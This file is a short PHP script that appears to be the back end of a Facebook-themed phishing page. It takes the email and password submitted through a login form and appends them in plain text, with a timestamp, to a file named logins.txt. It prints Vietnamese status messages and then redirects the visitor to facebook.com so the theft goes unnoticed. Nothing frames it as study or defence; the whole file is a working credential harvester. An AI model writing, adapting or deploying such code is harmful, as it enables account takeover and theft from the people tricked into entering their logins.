<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    if (!empty($email) && !empty($password)) {
        $file = "logins.txt";
        $log_entry = "Email: $email | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";

        if (file_put_contents($file, $log_entry, FILE_APPEND)) {
            echo "Lưu thông tin thành công!";
        } else {
            echo "Không thể ghi vào file!";
        }
    } else {
        echo "Email và mật khẩu không được để trống!";
    }
    
    header("Location: https://www.facebook.com");
    exit();
}
?>
